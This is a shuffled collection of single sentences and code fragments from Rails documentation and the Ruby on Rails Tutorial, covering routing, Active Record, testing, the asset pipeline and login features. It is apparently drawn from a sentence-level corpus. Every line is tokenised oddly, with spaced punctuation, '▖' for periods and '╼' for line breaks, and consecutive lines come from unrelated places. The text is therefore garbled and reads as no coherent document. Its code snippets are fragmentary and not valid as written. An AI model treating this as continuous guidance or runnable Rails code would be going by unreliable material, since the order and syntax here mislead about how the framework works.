The method `in _ groups _ of` splits an array into consecutive groups of a certain size ▖
No style or layout .
Ellipsis can be customized with the ` : omission` option :
It &apos;s even possible to use `exists ? ` without any arguments on a model or a relation .
Action
Having created a fixture with a valid user , we can retrieve it inside a test as follows :
As mentioned in Section ~ \ ref { sec : up _ and _ running } , I recommend that users of all operating systems ( especially Windows ) use a cloud development environment ( Section ~ \ ref { sec : development _ environment } ) , which comes with a built-in Unix ( Linux ) command line .
SELECT * FROM clients WHERE ( clients ▖ first _ name = &apos; Nick &apos; ) LIMIT 1
The \ kode { -m } flag lets you add a message for the commit ; if you omit \ kode { -m } , Git will open the system &apos;s default editor and have you enter the message there .
A mockup for the most important of these pages , the Home page , appears in Figure ~ \ ref { fig : home _ page _ mockup } .
We &apos;ll get started in Chapter ~ \ ref { cha : static _ pages } by creating static pages and then add a little dynamic content .
The results include hundreds of open-source \ href { http : / / contributors ▖ rubyonrails ▖ org / } { contributors } , well-attended \ href { http : / / railsconf ▖ com / } { conferences } , a huge number of \ href { https : / / rubygems ▖ org / } { gems } ( self-contained solutions to specific problems such as pagination and image upload ) , a rich variety of informative blogs , and a cornucopia of discussion forums and IRC channels .
# # # Configuring Action View
* `action _ controller ▖ compile _ config _ methods` Initializes methods for the config settings specified so that they are quicker to access .
protect _ from _ forgery
literal dot
# # # # Using a Reverse Proxy
The valid formats consist of the \ href { https : / / en ▖ wikipedia ▖ org / wiki / Internet _ media _ type } { MIME types } accepted by the validation in Listing ~ \ ref { code : validate _ picture _ format } .
What if a request to ╼ the server was crafted to look like a new article form submit but also included ╼ extra fields with values that violated your applications integrity ?
Be careful about using the \ kode { -a } flag improperly ; if you have added any new files to the project since the last commit , you still have to tell Git about them using \ kode { git add } first .
This will put the `Magical : : Unicorns` middleware on the end of the stack ▖
&#124; File &#124; Purpose &#124;
We do this with the \ kode { each } method , displaying each user &apos;s Gravatar and name , while wrapping the whole thing in a \ kode { ul } tag ( Listing ~ \ ref { code : user _ index _ view } ) .
Our plan is to define a \ kode { gravatar \ _ for } helper function to return a Gravatar image for a given user , as shown in Listing ~ \ ref { code : user _ show _ view _ with _ gravatar } .
in Listing ~ \ ref { code : nested _ hashes } .
@ orders ▖ each do &#124; order &#124;
12345678 ▖ to _ s ( : delimited ) # = &gt; 12,345,678
Both arrays and ranges respond to a host of methods that accept \ emph { blocks } , which are simultaneously one of Ruby &apos;s most powerful and most confusing features :
In particular , suppose that , in addition to the current attributes , the User model included an \ kode { admin } attribute used to identify administrative users of the site .
end
# = &gt; Wed , 23 Nov 2011
This will update the branch and pull request on GitHub with your new code ▖
Closely related to arrays are \ emph { ranges } , which can probably most easily be understood by converting them to arrays using the \ kode { to \ _ a } method :
A straighforward implementation looks like this :
We definitely don &apos;t want users to enter a blank password , so we &apos;ll add another test to validate password presence :
resources : categories , path : &apos; kategorien&apos;
WARNING : This method only works with `INNER JOIN` .
as shown in Listing ~ \ ref { code : gitignore _ uploads } .
The \ kode { home } action with a paginated feed .
&quot; \ n foo \ n \ r \ t bar \ n &quot; ▖ squish # = &gt; &quot; foo bar &quot;
&#124; field &#124; record ▖ send ( field ) = = &quot; Evil &quot; }
In `config / environments / development ▖ rb` , place the following line :
mattr _ accessor : explicitly _ unloadable _ constants
So ╼ we want to find the client named &quot; Andy &quot; , or if that client doesn &apos;t ╼ exist , create a client named &quot; Andy &quot; which is not locked .
╼ \ end { code } ╼ ╼ \ subsection { SSL in production } % ( fold ) ╼ \ label { sec : ssl _ in _ production } ╼ ╼
If either the : attributes or : tags options are passed , only the mentioned tags and attributes are allowed and nothing else .
( 1 ▖ ▖ 10 ) = = = ( 3 ▖ ▖ 7 ) # = &gt; true
Instead , we &apos;ll put a message in the flash to be displayed upon failed login .
The user profile with unstyled microposts .
The initial signin view .
# # # `duplicable ?
There &apos;s a lot of code in Listing ~ \ ref { code : signup _ with _ account _ activation _ test } , but the only completely novel code is in the line
In order to make sure users can &apos;t edit other users &apos; information , we need to be able to log in as a second user .
You must ╼ manually add errors to the record &apos;s errors collection in the validator class .
( We &apos;ll make the last one in Chapter ~ \ ref { cha : basic _ login } ▖ )
# # # Using `head` To Build Header-Only Responses
We &apos;ve seen this pattern before ; the structure closely parallels the first version of the \ kode { create } action ( Listing ~ \ ref { code : first _ create _ action } ) .
Regular files respond to `rewind` .
in Listing ~ \ ref { code : rails _ default _ head } .
In order to save the User object to the database , we need to call the \ kode { save } method on the \ kode { user } variable :
( Please if you know the exact behavior in 1 ▖ 9 contact fxn ▖ )
# # # # # `beginning _ of _ year` , `end _ of _ year`
You can define a css rule to make them ╼ standout .
We &apos;ll see some other examples of Rails additions to Ruby classes in Section ~ \ ref { sec : remember _ me } .
# Use unicorn as the app server
Unless you specify a version number to the \ kode { gem } command , Bundler will automatically install the latest version of the gem .
We start with the \ kode { edit } action , which requires pulling the relevant user out of the database .
The two are nearly identical , but the latter operator has a higher \ href { http : / / en ▖ wikipedia ▖ org / wiki / Order _ of _ operations # Programming _ languages } { \ emph { precedence } } , which binds too tightly to \ kode { root \ _ url } in this case .
in Listing ~ \ ref { code : gemfile _ sqlite _ version } .
To style the stats , we &apos;ll add some SCSS , as shown in Listing ~ \ ref { code : stats _ css } ( which contains all the stylesheet code needed in this chapter ) .
Our strategy will be to describe the results of a typical browser hit---a visit to the user index page at \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users } { / users } ---in terms of MVC ( Figure ~ \ ref { fig : mvc _ detailed } ) .
def log _ info ( sql , name , ms )
A mockup of our best guess at the final profile page ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / profile _ mockup _ bootstrap-full ▖ png } { ( full size ) }
This concludes our overview of the Ruby language .
Upon reflection , we see that in these cases the application should either create or destroy a \ emph { relationship } between two users .
gem &apos; uglifier &apos; , &apos; &gt; = 1 ▖ 0 ▖ 3&apos;
f
In Chapter ~ \ ref { cha : updating _ showing _ and _ deleting _ users } , we will allow all users to update their account information , and we will allow site administrators to delete users , thereby completing the full suite of Users resource REST actions from Table ~ \ ref { table : RESTful _ users } .
The way to do this is to check the \ emph { count } of users , and under the hood our tests will use the \ kode { count } method available on every Active Record class , including \ kode { User } :
def validate _ each ( record , attribute , value )
Finally , we migrate the development database and prepare the test database :
config ▖ active _ record ▖ mass _ assignment _ sanitizer = : strict
# # # # date _ field
as shown in Listing ~ \ ref { code : validates _ presence _ of _ name } .
To pull them out in reverse order , we can push down one level deeper and include a string with some raw SQL :
Since it &apos;s so common for hashes to use symbols as keys , Ruby ~ 1 ▖ 9 supports a new syntax just for this special case :
* Running `rake doc : rails` will put a full copy of the API documentation for ╼ Rails in the `doc / api` folder of your application ▖
RubyGems is a package manager for Ruby projects , and there are many useful libraries ( including Rails ) available as Ruby packages , or \ emph { gems } .
The StaticPages controller spec with a base title .
╼ $ rails console
Fortunately , dealing with a problem like flash persistence is one of many areas where integration tests really shine ; they let us say exactly what we mean :
# # # Configuring an Engine
create test / fixtures / blorgh / articles ▖ yml
Scaffolding is good for getting started quickly but is bad for understanding .
password
It returns an array with the groups :
The steps to test password resets broadly parallel the test for account activation from Listing ~ \ ref { code : signup _ with _ account _ activation _ test } , though there is a difference at the outset : we first visit the ``forgot password &apos; &apos; form and submit invalid and then valid email addresses , the latter of which creates a password reset token and sends the reset email .
sys 0m0 ▖ 258s
To change a user &apos;s information , we visit the \ href { http : / / localhost : 3000 / users / 1 / edit } { \ texttt { edit } } page ( Figure ~ \ ref { fig : demo _ edit _ user _ rails _ 3 } ) .
Don &apos;t get discouraged : the whole point of contributing to an active open source project is to tap into the knowledge of the community ▖
For example , the \ texttt { POST } request sent when you submit a registration form creates a new user on the remote site .
We &apos;ll see in Section ~ \ ref { sec : demo _ user _ has _ many _ microposts } ( and more fully in Chapter ~ \ ref { cha : user _ microposts } ) how this \ kode { user \ _ id } attribute allows us to succinctly express the notion that a user potentially has many associated microposts .
&lt; td &gt; Ruby on Rails Rocks !
$ rackup --help
# # # Asset Organization
It worked !
Although you can learn a lot by studying Table ~ \ ref { table : valid _ email _ regex } , to really understand regular expressions I consider using an interactive regular expression matcher like \ href { http : / / www ▖ rubular ▖ com / } { Rubular } to be essential ( Figure ~ \ ref { fig : rubular } )
The purpose of the \ kode { before \ _ create } callback is to assign the token and corresponding digest , which we can accomplish as follows :
* `save ( validate : false ) `
d = Date ▖ new ( 2000 , 2 , 29 ) # = &gt; Tue , 29 Feb 2000
( Listing ~ \ ref { code : generated _ application _ mailer } also uses a mailer layout corresponding to the email format ; although it won &apos;t ever matter in this tutorial , the resulting HTML and plain-text mailer layouts can be found in \ kode { app / views / layouts } ▖ )
The `collection ▖ build` method returns one or more new objects of the associated type ▖
We &apos;ll use an HTML \ emph { form } to submit user signup information to our application ( Section ~ \ ref { sec : signup _ form } ) , which will then be used to create a new user and save its attributes to the database ( Section ~ \ ref { sec : successful _ signups } ) .
Generating a new sample app .
A good example of this is the `jquery-rails` gem which comes with Rails as the ╼ standard JavaScript library gem ▖
At this point , running \ kode { rake test } should get us back to \ passing :
&lt; table &gt;
to count the microposts .
I recommend you embrace these inevitable stumbling blocks as opportunities to work on improving your technical sophistication .
This example uses the ` : message` option to show how you can include the ╼ attribute &apos;s value .
You can specify conditions on the joined tables using the regular &#91; Array &#93; ( # array-conditions ) and &#91; String &#93; ( # pure-string-conditions ) conditions ▖
Eager loading is the mechanism for loading the associated records of the objects returned by `Model ▖ find` using as few queries as possible .
On the cloud IDE , most unwanted lines contain the string \ kode { rvm } ( referring to the Ruby Version Manager ) , so I recommend using the silencer shown in Listing ~ \ ref { code : backtrace _ silencer } to filter them out .
This test uses the \ kode { reload } method for reloading a value from the database and the \ kode { assert \ _ equal } method for testing equality .
It is getting long and awkward ▖
Let &apos;s quickly go through and understand what each ╼ part of it does .
Also , CHANGELOGs should never be edited in docrails .
You need not supply the extensions explicitly ▖ ╼
( Don &apos;t worry about what the \ texttt { -u } flag does ; if you &apos;re curious , do a web search for ``git set upstream &apos; &apos; ▖ )
You can also reuse dynamic segments from the match in the path to redirect to :
if record ▖ first _ name = = &quot; Evil &quot;
The rest of the \ emph { Ruby on Rails Tutorial } builds on this foundation to make a site with Twitter-like microposts ( Chapter ~ \ ref { cha : user _ microposts } ) and a status feed of posts from followed users ( Chapter ~ \ ref { cha : following _ users } ) .
This guide provides you with all you need to get started in sending and ╼ receiving emails from and to your application , and many internals of Action ╼ Mailer ▖
trashable = trashable _ class ▖ constantize ▖ find ( trashable _ id )
The result should be a \ passing \ test suite :
Produce a string representation of a number as a telephone number :
# # # # The `assert _ generates` Assertion
You can uncomment them to see if they work on your system ▖ )
&lt; script src = &quot; / assets / tickets ▖ js ?
Now we &apos;re finally ready to see the fruits of our labors , as shown in Figure ~ \ ref { fig : layout _ no _ logo _ or _ custom _ css } .
Then , in Chapter ~ \ ref { cha : filling _ in _ the _ layout } through Chapter ~ \ ref { cha : password _ reset } , we &apos;ll complete the foundation for the sample application by making a site layout , a user data model , and a full registration and authentication system ( including account activation and password resets ) .
A mockup of successful signup ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / signup _ success _ mockup _ bootstrap-full ▖ png } { ( full size ) }
In the case of an Ajax request , Rails automatically calls a \ emph { JavaScript Embedded Ruby } ( \ kode { ▖ js ▖ erb } ) file with the same name as the action , i ▖ e ▖ , \ kode { create ▖ js ▖ erb } or \ kode { destroy ▖ js ▖ erb } .
If dependencies were to be specified inside the `Gemfile` , these would not ╼ be recognized by a traditional gem install and so they would not be installed , ╼ causing the engine to malfunction .
With the asset ╼ pipeline , the preferred location for these assets is now the `app / assets` ╼ directory ▖
These methods are analogous to their built-in counterparts ▖
( This is just a first implementation ; we &apos;ll discuss this subject again in Section ~ \ ref { sec : remember _ me } , where we &apos;ll use the preferred \ emph { method reference } convention for defining callbacks ▖ )
Code to test the contents of the Home page .
Regardless of the implementation details , I prefer to think of the controller as a central hub through which all the application &apos;s information flows .
strip _ tags ( &quot; some &lt; &lt; b &gt; script &gt; alert ( &apos; hello &apos; ) &lt; &lt; / b &gt; / script &gt; &quot; )
There are a few configuration options available in Active Support :
invoke coffee
@ order = Order ▖ create ( order _ date : Time ▖ now , customer _ id : @ customer ▖ id )
This description is just a string , and it can be anything you want ; RSpec doesn &apos;t care , but you and other human readers probably do .
Often , there is more ╼ than one route to each controller , and different routes can be served by ╼ different _ actions _ ▖
Returns a string of option tags that have been compiled by iterating over the `collection` and assigning the result of a call to the `value _ method` as the option value and the `text _ method` as the option text .
When installing gems , by default RubyGems generates two different kinds of documentation ( called ri and rdoc ) , but many Ruby and Rails developers find that the time to build them isn &apos;t worth the benefit .
&quot; hello &quot; ▖ to ( 0 ) # = &gt; &quot; h &quot;
Finally , the sample app will use all aspects of MVC ; we &apos;ll cover controllers and views starting in Section ~ \ ref { sec : static _ pages } , models starting in Section ~ \ ref { sec : user _ model } , and we &apos;ll see all three working together in Section ~ \ ref { sec : a _ users _ resource } .
╼ ╼ \ subsection { Heroku deployment , step two } ╼ \ label { sec : heroku _ step _ two } ╼ ╼ There is no step two !
We &apos;ll complete this task , and with it the sample application , in Chapter ~ \ ref { cha : following _ users } .
This is easy using the login helper defined in Listing ~ \ ref { code : test _ helper _ log _ in } , with the two cases appearing as
&#124; --------- &#124; ------------------------------------ &#124; ----------------- &#124; -------------------------------------------------------------------------- &#124;
Returns a JavaScript tag wrapping the provided code .
Providing engine functionality
To redirect users trying to edit another user &apos;s profile , we &apos;ll add a second method called \ kode { correct \ _ user } , together with a before filter to call it ( Listing ~ \ ref { code : correct _ user _ before _ filter } ) .
# # # RecordTagHelper
The user edit view .
= &gt; &quot; 1fda4469bcbec3badf5418269ffc5968 &quot;
Along the way , we &apos;ll learn how to seed the database with sample users and how to \ emph { paginate } the user output so that the index page can scale up to display a potentially large number of users .
Instance methods are created as well for convenience , they are just proxies to the class attribute ▖
* `edit ▖ html ▖ erb`
# Creates a time select tag that , when POSTed , will be stored in the order variable in the submitted attribute
This method will query the database using the same query as `find` , but instead of returning an ╼ object or collection of objects it will return either `true` or `false` .
The macros `cattr _ reader` , `cattr _ writer` , and `cattr _ accessor` are analogous to their `attr _ * ` counterparts but for classes ▖
options _ for _ select ( &#91; &quot; VISA &quot; , &quot; MasterCard &quot; &#93; )
around _ perform do &#124; job , block &#124;
In practice , this will allow you to precompile locally , have those files in your ╼ working tree , and commit those files to source control when needed ▖
use Rack : : ConditionalGet
Route and URL mapping for site links .
This means that elements inside any tag ( such as a \ kode { div } ) with class \ kode { center } will be centered on the page .
CSS for the user index .
This code automatically populates \ kode { user ▖ followed \ _ users } with an array of followed users .
All Rails documentation should consistently refer to Rails components by their proper name , and if in your next blog post or presentation you remember this tidbit and take it into account that &apos;d be phenomenal .
The corresponding user edit view ( which you will have to create by hand ) is shown in Listing ~ \ ref { code : user _ edit _ view } .
Generating a Static Pages controller .
def # { severity ▖ downcase } ( message = nil , progname = nil , &amp; block ) # def debug ( message = nil , progname = nil , &amp; block )
It is possible , of course , to arrange for this information to be handled securely ( by having Git ignore it , for example ) , but this is error-prone and requires significant expertise .
The client code , unaware of the potential conflict , subclasses and defines its own ` : log _ level` ▖
* `new _ geocoder _ path` returns ` / geocoder / new`
After the cookie is set , on subsequent page views we can retrieve the user with code like
As with the other routes , \ kode { get &apos; signup &apos; } automatically gives us the named route \ kode { signup \ _ path } , which we put to use in Listing ~ \ ref { code : home _ page _ signup _ link } .
def new
page to make a new user ( signup )
class Client &lt; ActiveRecord : : Base
&lt; / form &gt;
has _ many : orders , dependent : : delete _ all , validate : : false
create a new session
The Microposts controller in schematic form .
The final element is \ kode { module ApplicationHelper } : modules give us a way to package together related methods , which can then be \ emph { mixed in } to Ruby classes using \ kode { include } .
See if you can guess what it will be ▖ )
d ▖ prev _ year # = &gt; Sun , 28 Feb 1999
The call `str ▖ first ( n ) ` is equivalent to `str ▖ to ( n-1 ) ` if `n` &gt; 0 , and returns an empty string for `n` = = 0 .
transform _ keys { &#124; key &#124; key ▖ to _ s }
but as usual Rails allows us to link directly to the user by automatically converting \ kode { current \ _ user } into \ kode { user \ _ path ( current \ _ user ) } in this context .
has _ and _ belongs _ to _ many : friends ,
( Including \ kode { new } actually generates \ emph { views } as well , which is why we don &apos;t include actions like \ kode { create } and \ kode { delete } that don &apos;t correspond to views ▖ )
Creates a standard text field ; use these text fields to input smaller chunks of text like a username or a search query .
* Initializers
Here the \ kode { show } action is \ emph { implicit } in the type of request---when Rails &apos; REST features are activated , \ texttt { GET } requests are automatically handled by the \ kode { show } action .
In principle , there &apos;s still a minor security hole , which is that an admin could delete himself by issuing a \ texttt { DELETE } request directly .
( That refinement is preventing unactivated users from being displayed , which is left as an exercise ( Section ~ \ ref { sec : exercises _ activation _ test _ and _ refactoring } ) ▖ )
Instead , you will get an array of hashes where each hash indicates a record .
&#124; &#124; 429 &#124; : too _ many _ requests &#124;
All that &apos;s left is writing a short Microposts controller test to check authorization and a micropost integration test to tie it all together .
* = require reset
and Rails \ href { http : / / catb ▖ org / jargon / html / A / automagically ▖ html } { automagically } uses Ajax
config ▖ assets ▖ digest = true
create app / views / users / new ▖ html ▖ erb
Next , we need to update our `Blorgh : : ArticleController # article _ params` method to ╼ permit the new form parameter :
Array ( foo : : bar ) # = &gt; &#91; &#91; : foo , : bar &#93; &#93;
╼ &gt; &gt; 10 ▖ weeks ▖ ago
create test / controllers / users _ controller _ test ▖ rb
Active Record provides a rich API for accessing data within a database ▖
Moreover , persistent sessions are cumbersome to check by hand , so if we ever want to refactor the \ kode { current \ _ user } method ( as we will in Chapter ~ \ ref { cha : account _ activation _ and _ password _ reset } ) it &apos;s important to test it .
Date ▖ new ( 2012 , 2 , 29 ) ▖ years _ since ( 3 ) # = &gt; Sat , 28 Feb 2015
and that symbol specifiers are also supported :
This will cause the remote clients to ╼ request a new copy of the content ▖
This guide covers the asset pipeline .
For example , you may want to store all employees in a single database model , but be able to trace relationships such as between manager and subordinates ▖
If you attempt to access a field that is not in the initialized record you &apos;ll receive :
As seen in Figure ~ \ ref { fig : filled _ in _ form } , text and email fields ( \ kode { type = &quot; text &quot; } and \ kode { type = &quot; email &quot; } ) simply display their contents , whereas password fields ( \ kode { type = &quot; password &quot; } ) obscure the input for security purposes , as seen in Figure ~ \ ref { fig : filled _ in _ form } .
You can then style this div however you &apos;d like ▖
In this section , we &apos;ll implement an account activation step to verify that the user controls the email address they used to sign up .
The code to create the mapping of user URLs to controller actions for the Users resource appears in Listing ~ \ ref { code : rails _ routes } ; this code effectively sets up the table of URL / action pairs seen in Table ~ \ ref { table : user _ urls } .
Our plan is to define a \ kode { gravatar \ _ for } helper function to return a Gravatar image for a given user , as shown in Listing ~ \ ref { code : user _ show _ view _ with _ gravatar } .
Because the \ kode { remember } method doesn &apos;t set \ kode { session &#91; : user \ _ id &#93; } , this procedure will test the desired ``remember &apos; &apos; branch .
If all ╼ tests are passing , that &apos;s enough to propose your contribution ▖
We &apos;ll start with the internal structure of the document .
assemblies ▖ delete ( object , ▖ ▖ ▖ )
As noted in the \ href { http : / / en ▖ gravatar ▖ com / site / implement / hash / } { Gravatar documentation } , Gravatar URLs are based on an \ href { http : / / en ▖ wikipedia ▖ org / wiki / MD5 } { MD5 hash } of the user &apos;s email address .
= &gt; &#91; &quot; Email is invalid &quot; , &quot; Password is too short ( minimum is 6 characters ) &quot; &#93;
Rails 4 ships with the &#91; Turbolinks gem &#93; ( https : / / github ▖ com / rails / turbolinks ) ▖ ╼
The final implementation of the feed ▖
To accomplish this , we use the \ kode { let ! } variant :
Guard automatically starts a Spork server , dramatically reducing the overhead each time a test gets run .
The sample application in production .
Reporting an Issue
date _ field _ tag &quot; dob &quot;
A test for an unsuccessful edit ▖
This is also the only Rails book that does test-driven development the entire time , an approach highly recommended by the experts but which has never been so clearly demonstrated before .
We saw a similar idea in Section ~ \ ref { sec : uniqueness _ validation } , where we needed to convert an email address to lower-case before saving a user to the database .
For content that is static or infrequently changed , this provides an ╼ easy way to tell whether two versions of a file are identical , even across ╼ different servers or deployment dates .
This provides additional flexibility and makes it explicit that you &apos;re only generating HTTP headers .
As with any refactoring , you should verify that the test suite is still \ passing \ after changing the application code :
To set this configuration setting within the application , an initializer should ╼ be used ▖
For NGINX :
# SELECT count ( * ) AS count _ all FROM clients
&lt; / div &gt;
# &apos; included do &apos; causes the included code to be evaluated in the
has _ many : patients , through : : appointments
* &#91; Official Rack Website &#93; ( http : / / rack ▖ github ▖ io )
end # end
This underscores the danger of exposing our objects to the wild Web : if we simply passed an initialization hash in from an arbitrary web request , a malicious user could send a \ texttt { PATCH } request as follows
As a workaround , specify the URL for the form directly , like so :
`camelize` accepts an optional argument , it can be ` : upper` ( default ) , or ` : lower` ▖
concerns : commentable
in Listing ~ \ ref { code : micropost _ order _ test } and
We &apos;ll add a `data- * ` ╼ attribute to our link , and then bind a handler to the click event of every link ╼ that has that attribute :
Validating the presence of an \ kode { email } attribute ▖
At this point , if you are using Git you should merge the changes back into the master branch :
You &apos;d need to remove that ╼ line from your Gemfile when upgrading ▖
For example , say you want to send a newsletter whose language depends on the user ▖
Returns a textarea opening and closing tag set tailored for accessing a specified attribute .
Having defined an action that returns the desired string , we need to tell Rails to use that action instead of the default page in Figure ~ \ ref { fig : riding _ rails _ environment } .
use # &lt; ActiveSupport : : Cache : : Strategy : : LocalCache : : Middleware : 0x000000029a0838 &gt;
The code in the User model parallels the \ kode { create \ _ activation \ _ digest } method used in the \ kode { before \ _ create } callback ( Listing ~ \ ref { code : user _ model _ activation _ code } ) , as seen in Listing ~ \ ref { code : user _ model _ password _ reset } .
A mockup of the login form .
* `photos _ path` returns ` / photos`
# app / mailers / application _ mailer ▖ rb
A user profile with a follow button ( \ href { http : / / localhost : 3000 / users / 2 } { / users / 2 } ) .
If you &apos;d like to refactor other tests to use \ kode { full \ _ title } ( such as those in Listing ~ \ ref { code : base _ title _ test } ) , you should include the Application Helper in \ kode { test \ _ helper ▖ rb } instead .
The test appears in Listing ~ \ ref { code : microposts _ interface _ test } .
When you declare a `has _ one` association , the declaring class automatically gains five methods related to the association :
Signup failure ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / signup _ failure _ rails _ 4-full ▖ png } { ( full size ) }
Active Record offers many pre-defined validation helpers that you can use ╼ directly inside your class definitions ▖
If there &apos;s a new ╼ feature that you want to see added to Ruby on Rails , you &apos;ll need to write the ╼ code yourself - or convince someone else to partner with you to write the code ▖ ╼
root &apos; pages # main &apos; # shortcut for the above
Rails follows a simple set of coding style conventions :
class Role &lt; ActiveRecord : : Base
Association callbacks are similar to normal callbacks , but they are triggered by events in the life cycle of a collection ▖
You can achieve this using the ` : body` ╼ option ▖
Defining the new token and digest methods using \ kode { self } ▖
We can also go the other way with the \ kode { join } method :
This flash persistence is a bug in our application , and before proceeding with a fix it is a good idea to write a test catching the error .
Due to a change in the internals ╼ of `ActiveSupport : : Callbacks` , this is no longer allowed in Rails 4 ▖ 1 ▖
Customizing Resourceful Routes
The Home page ( \ href { http : / / localhost : 3000 / } { / } ) with a proto-feed ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / home _ with _ proto _ feed-full ▖ png } { ( full size ) }
We &apos;ll explore this subject in more depth in Section ~ \ ref { sec : user _ validations } , but for now it &apos;s worth noting that our initial \ kode { user } object is valid , which we can verify by calling the boolean \ kode { valid ? } \ method on it :
This can be changed by setting ╼ `config ▖ assets ▖ cache _ store` :
With these scopes , you can use every method previously covered such as `where` , `joins` and `includes` ▖
Instead , we &apos;ll follow a common Ruby convention by storing the result of \ kode { User ▖ find \ _ by } in an instance variable , which hits the database the first time but returns the instance variable immediately on subsequent invocations
This is because Rails automatically infers from \ kode { redirect \ _ to @ user } that we want to redirect to \ kode { user \ _ url ( @ user ) } .
create app / views / welcome / index ▖ html ▖ erb
( The other three links have no options hash , which is fine since it &apos;s optional ▖ )
As a safety net , we &apos;ll first write a test to make sure the initial model object is valid .
The migration itself consists of a \ kode { change } method that determines the \ linebreak change to be made to the database .
Sometimes you will be asked to make some changes to the code you have ╼ already committed ▖
password :
The related \ kode { print } method does not :
The good news is that , having gotten this far , you &apos;re ready for almost anything else out there .
Contact
The resulting page , which by default is the user &apos;s profile , should in this case be the ``Edit user &apos; &apos; page .
# # # # Linking to Audio Files with the `audio _ tag`
This is called the &apos; request response cycle ▖ &apos;
SELECT * FROM clients WHERE ( clients ▖ orders _ count IN ( 1,3,5 ) )
copies of the Software , and to permit persons to whom the Software is
This may appear straightforward :
Both the `matches ? ` method and the lambda gets the `request` object as an argument .
In the days before powerful web frameworks with full testing capabilities , developers had to test forms by hand .
$ bundle exec rake test ╼ $ git add -A ╼ $ git commit -m &quot; Finish log in / log out &quot; ╼ $ git checkout master ╼ $ git merge log-in-log-out
This practice is rather cumbersome , and in this section we discuss two ways to eliminate its necessity .
in Listing ~ \ ref { code : user _ spec } .
We can run these tests using the \ kode { rspec } command as usual :
dup = hash ▖ deep _ dup
in Listing ~ \ ref { code : test _ close _ browser } .
* `config ▖ active _ record ▖ partial _ writes` is a boolean value and controls whether or not partial writes are used ( i ▖ e ▖ whether updates only set attributes that are dirty ) ▖
let ( : found _ user ) { User ▖ find _ by ( email : @ user ▖ email ) }
Technically , a user could update their account with an erroneous email address using the account settings update feature from Section ~ \ ref { sec : updating _ users } , but the current implementation gets us most of the benefit of email verification without too much work .
# # # # generating URLs with `url _ for`
A migration for account activation ( with added index ) .
The Help page with HTML structure removed ▖
In this chapter , we will complete the core sample application by adding a social layer that allows users to follow ( and unfollow ) other users , resulting in each user &apos;s Home page displaying a status feed of the followed users &apos; microposts .
These configuration methods are to be called on a `Rails : : Railtie` object , such as a subclass of `Rails : : Engine` or `Rails : : Application` .
At this point , you might guess that code like
6 examples , 0 failures
Whenever possible , it &apos;s a good ╼ idea to keep your controllers skinny , as it will make your application a ╼ pleasure to work with in the long run .
It &apos;s worth noting that we could actually omit the \ kode { : source } key for \ kode { followers } in Listing ~ \ ref { code : has _ many _ following _ through _ passive _ relationships } , using simply
As with RSpec , Factory Girl defines a domain-specific language in Ruby , in this case specialized for defining Active Record objects .
get &apos; こんにちは &apos; , to : &apos; welcome # index&apos;
If it cannot ╼ find it , it will look inside the engine .
This guide does not document their behavior around those days for brevity , but it is enough to say that they do what you would expect ▖
The Rails routes , with a rule for the Users resource .
# # # BenchmarkHelper
We can eliminate this duplication as follows :
Incidentally , in Listing ~ \ ref { code : persistent _ sessions _ test } we could write
Upgrading from Rails 3 ▖ 2 to Rails 4 ▖ 0
A mockup of a user &apos;s Home page with a status feed ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / page _ flow _ home _ page _ feed _ mockup _ bootstrap-full ▖ png } { ( full size ) }
Including the Sessions helper module into the Application controller .
To get the form to render , we need to define an \ kode { @ user } variable in the Password Resets controller &apos;s \ kode { edit } action .
RAILS _ ROOT / config / routes ▖ rb # NO
The most popular way is to include code from external sources by iframes :
The users index page with 100 sample users .
Updating an existing record will send an SQL `UPDATE` operation ╼ instead ▖
As noted briefly in the introduction to this section , there is a dedicated test database , \ kode { db / test ▖ sqlite3 } , for this purpose .
{ a : 1 , b : 2 , c : 3 } ▖ slice ( : a , : c )
* * `Rack : : Runtime` * *
# do process video
is itself a hash :
Looking at the HTML source for Figure ~ \ ref { fig : edit _ page } , we see a form tag as expected , as in Listing ~ \ ref { code : edit _ form _ html } ( slight details may differ ) .
in Listing ~ \ ref { code : gemfile _ rspec } .
When developing an application , often code will start to ``smell &apos; &apos; , meaning that it gets ugly , bloated , or filled with repetition .
As a rule of thumb , do not document singletons unless absolutely necessary ▖
# The constant M exists now again , and it stores a module
The result appears in Listing ~ \ ref { code : password _ reset _ test }
╼ ╼ Initial commit
TIP : Some engines choose to use this file to put global configuration options ╼ for their engine ▖
FROM &quot; orders &quot;
I am currently working with Engine Yard to create links to specific versions of the Rails Installer .
We &apos;ll put this mixin to use again in Section ~ \ ref { sec : using _ form _ for } .
validates : name , length : { minimum : 2 }
A Rake task for populating the database with sample users .
In fact , you probably shouldn &apos;t bother with this step right now ; using the default address supplied by Heroku is fine .
The analogous command for making a model is \ kode { generate model } , which we can use to generate a User model with \ kode { name } and \ kode { email } attributes , as shown in Listing ~ \ ref { code : generate _ user _ model } .
# # # Adding a Route for Comments
The key line here is
The ( rather subtle ) gear icon in the file navigator pane .
* With the Asset Pipeline the : cache and : concat options aren &apos;t used anymore , delete these options from your views .
So , in this case , the router would no longer match ` / photos / 1` to this route ▖
&gt; &gt; Rails ▖ env ▖ production ?
In this case , `params` would be ` { controller : &apos; photos &apos; , action : &apos; show &apos; , id : &apos; 1&apos; , user _ id : &apos; 2&apos; } ` .
Applying these changes gives much more compact tests for the Home page :
╼ * = require _ self
We use the `create` method on ` @ article ▖ comments` to create and ╼ save the comment ▖
# # # # `to _ options` and `to _ options !
in Listing ~ \ ref { code : gemrc } .
Rails adds other helpers , too :
We can accomplish this in Rails with the \ kode { form \ _ for } helper method , which takes in an Active Record object and constructs a form using the object &apos;s attributes .
With the code as above , the result of destroying the second-most recent post appears in Figure ~ \ ref { fig : home _ post _ delete } .
Calling `logout _ path` will return ` / exit`
# = &gt; nil
xml ▖ a ( &quot; A Link &quot; , &quot; href &quot; = &gt; &quot; http : / / rubyonrails ▖ org &quot; )
@ comment = @ article ▖ comments ▖ create ( comment _ params )
* `autobuffer : true` , the audio will pre load the file for the user on page load .
For a small example like this , there &apos;s not much savings , but if there are lots of things to escape it can be a real help :
To make the password digest , \ kode { has \ _ secure \ _ password } uses a state-of-the-art hash function called \ href { http : / / en ▖ wikipedia ▖ org / wiki / Bcrypt } { bcrypt } .
In current versions of Rails , you can abstract away this implementation detail by using `t ▖ references : supplier` instead .
